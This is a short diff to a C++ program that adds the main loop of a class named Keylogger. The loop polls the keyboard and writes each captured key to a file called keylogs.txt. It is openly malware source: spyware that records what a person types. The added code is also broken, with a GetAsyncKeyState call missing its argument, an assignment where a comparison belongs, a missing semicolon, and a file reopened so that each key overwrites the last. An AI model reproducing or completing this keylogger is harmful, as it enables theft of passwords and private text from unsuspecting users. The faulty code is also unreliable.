@@ -40,5 +40,20 @@ cout << "Later use.";
 int main(){
 Keylogger keylog;
 Keylogger *keys = &keylog;
+char key;
+string filename = "keylogs.txt";
+while(TRUE){
+	Sleep(10);
+	for(key = 8; key<=190;key++){
+		if(GetAsyncKeyState() = -32767){
+			if(KeyIsListed(key) == FALSE){
+				ofstream file;
+				file.open(filename);
+				file << key;
+				file.close()
+			}
+		}
+	}
+}
 return 0;
 }
